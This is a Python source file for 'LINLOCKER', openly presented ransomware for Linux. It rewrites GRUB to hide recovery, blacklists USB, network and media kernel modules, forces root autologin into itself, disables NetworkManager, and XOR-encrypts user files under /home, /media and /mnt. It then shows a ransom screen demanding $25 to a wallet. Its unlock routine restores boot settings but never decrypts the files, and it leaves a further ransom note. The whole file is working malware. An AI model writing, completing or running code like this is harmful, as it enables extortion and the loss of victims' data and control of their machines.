# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 12.11.2025
# APP: LINLOCKER
# TYPE: OS_LOCKER
# VERSION: LATEST
# PLATFORM: linux




WALLET = 'HERE IS LINCLOKER WALLET'
PASSWORD = 'HERE IS LINLOCKER PASSWORD'
KEY = 'HERE IS LINLOCKER ENCRYPTOR PASSWORD'




import os
import subprocess as sp

from glob import glob
from sys import version
from hashlib import sha256
from shutil import move as move_file


PYTHON_VERSION = version[0]

FILE = __file__
FILE_NAME = os.path.split(FILE)[1]

PATH = '/etc/linlocker'
PATH_FILE = PATH + '/' + FILE_NAME
PATH_FLAG = PATH + '/' + 'flag'
PATH_KEY = '/etc/linlocker.tmp'

USERS = glob('/home/*')

ENCRYPTION_PATH = [
    USERS,
    glob('/media/*'),
    glob('/mnt/*')
]

LOGO = '''
 ####      ####    ##   ##  ####      ####    ##   ##  ##   ##  ##  ##
  ##        ##     ###  ##   ##        ##     ###  ##  ##   ##  ##  ##
  ##        ##     #### ##   ##        ##     #### ##  ##   ##   ####
  ##        ##     ## ####   ##        ##     ## ####  ##   ##    ##
  ##   #    ##     ##  ###   ##   #    ##     ##  ###  ##   ##   ####
  ##  ##    ##     ##   ##   ##  ##    ##     ##   ##  ##   ##  ##  ##
 #######   ####    ##   ##  #######   ####    ##   ##   #####   ##  ##
'''.strip()


def init():
    if not os.path.exists(PATH):
        os.mkdir(PATH)

    if not os.path.exists(PATH_FILE):
        move_file(FILE, PATH_FILE)
    
    with open('/etc/default/grub', 'w') as grub:
        grub.write('''
GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_HIDDEN_TIMEOUT_QUIET=true
GRUB_DISABLE_RECOVERY=true
GRUB_RECORDFAIL_TIMEOUT=0
GRUB_DISTRIBUTOR=linlocker
GRUB_CMDLINE_LINUX_DEFAULT="quiet nosplash audit=0 loglevel=0 systemd.show_status=0 systemd.unit=multi-user.target"
GRUB_CMDLINE_LINUX=""
GRUB_TERMINAL=console
'''.strip())
    
    with open('/etc/modprobe.d/linlocker.conf', 'w') as linlocker_conf:
        linlocker_conf.write('''
blacklist uas
blacklist usb_storage
blacklist cdc_acm
blacklist cdc_ether
blacklist usbnet
blacklist mmc_block
blacklist orinoco
blacklist prism2_usb
blacklist ath9k
blacklist b43
blacklist e1000e
blacklist iwlwifi
blacklist r8169
blacklist brcmsmac
blacklist rtl8188eu
blacklist rtl8192cu
blacklist bnep
blacklist bluetooth
blacklist btusb
blacklist rfcomm
blacklist snd_hda_intel
blacklist snd_hda_codec_hdmi
blacklist snd_soc_sst_broadwell
blacklist snd_sof_pci
blacklist snd_usb_audio
blacklist gspca_main
blacklist gspca_v4l
blacklist uvcvideo
'''.strip())
        
    if not os.path.exists('/etc/systemd/system/getty@.service.d'):
        os.mkdir('/etc/systemd/system/getty@.service.d')
        
    with open('/etc/systemd/system/getty@.service.d/override.conf', 'w') as override_conf:
        override_conf.write(f'''
[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin root --noclear %I $TERM
ExecStart=                  
ExecStart=python{PYTHON_VERSION} {PATH_FILE}                       
Type=idle
'''.strip())
        
    sp.run(['sudo', 'update-grub'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
    sp.run(['sudo', 'update-initramfs', '-u'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
    sp.run(['sudo', 'systemctl', 'set-default', 'multi-user.target'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
    sp.run(['sudo', 'systemctl', 'disable', 'NetworkManager'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)

    with open(PATH_FLAG, 'w') as flag:
        flag.write('shell')
    
    with open(PATH_KEY, 'w') as file_key:
        file_key.write(KEY)

    sp.run(['sudo', 'reboot'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)


def welcome():
    sp.run(['clear'])
    
    print(LOGO)
    print('\n\nYour system is completely locked')
    print('Enter password to unlock it')
    print('To receive the password you need to send $25 here', WALLET)
    print('After sending the money you will be sent a password to restore the system\n\n')

    password = input('Password: ').strip().lower()

    if password == PASSWORD:
        sp.run(['clear'])
        print('Your system has been restored')
        destroy()
    elif password == 'exit':
        sp.run(['sudo', 'poweroff'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        os.abort()
        

def generate_password(password, length):
    hash_bytes = sha256(password.encode()).digest()
    return (hash_bytes * ((length // len(hash_bytes)) + 1))[:length]


def xor_data(data, password):
    return bytes([b ^ k for b, k in zip(data, generate_password(password, len(data)))])


def encrypt_file(file_path, password):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        if data.startswith(b'linlocker\n'):
            return

        with open(file_path, 'wb') as f:
            f.write(b'linlocker\n' + xor_data(data, password))
    except:
        print(file_path, 'no!')
    else:
        print(file_path, 'ok!')


def encrypt(main_path):
    for sub_path in main_path:
        for root, _, files in os.walk(sub_path):
            try:
                dir = root.split('/')[3]

                if (dir[0] != '.') and (dir not in ['snap']):
                    for path_file in files:
                        encrypt_file(os.path.join(root, path_file), KEY)
            except: 
                continue


def shell():
    sp.run(['clear'])

    for encrypt_path in ENCRYPTION_PATH:
        try: 
            encrypt(encrypt_path)
        except:
            continue

    while True:
        try:
            welcome()
        except: 
            continue


def destroy():
    sp.run(['sudo', 'rm', '-rf', PATH])

    with open('/etc/default/grub', 'w') as grub:
        grub.write('''
GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_DISTRIBUTOR=Linux
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
GRUB_CMDLINE_LINUX=""
'''.strip())
        
    try:
        os.remove('/etc/modprobe.d/linlocker.conf')
    except: ...

    try:
        os.remove('/etc/systemd/system/getty@.service.d/override.conf')
    except: ...

    sp.run(['sudo', 'update-grub'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
    sp.run(['sudo', 'update-initramfs', '-u'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
    sp.run(['sudo', 'systemctl', 'set-default', 'graphical.target'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
    sp.run(['sudo', 'systemctl', 'enable', 'NetworkManager'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)

    for user in USERS:
        try:
            with open(user + '/requirement.txt', 'w') as requirement_txt:
                requirement_txt.write(LOGO)
                requirement_txt.write(f'\n\nYour data is encrypted\nTo decrypt send here {WALLET} $25\nAnd it will send you a decryption program')
        except:
            continue

    sp.run(['sudo', 'reboot'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
    os.abort()
    

def main():
    if ((not WALLET) or (not PASSWORD) or (not KEY)
        ) or ((WALLET == 'HERE IS LINCLOKER WALLET'
         ) or (PASSWORD == 'HERE IS LINLOCKER PASSWORD'
         ) or (KEY == 'HERE IS LINLOCKER ENCRYPTOR PASSWORD')):
        print('initialized data is invalid')
        os.abort()

    if not os.path.exists('/etc/os-release') or not os.path.exists('/etc/default/grub'):
        print('DO NOT SUPPORT OS')
        os.abort()

    if os.getuid() != 0:
        sp.run(['sudo', 'python' + PYTHON_VERSION, FILE])
        os.abort()

    sp.run(['stty', 'intr', 'undef'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
    sp.run(['stty', 'susp', 'undef'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)

    shell() if os.path.exists(PATH_FLAG) else init()


try:
    main()
except: 
    os.abort()
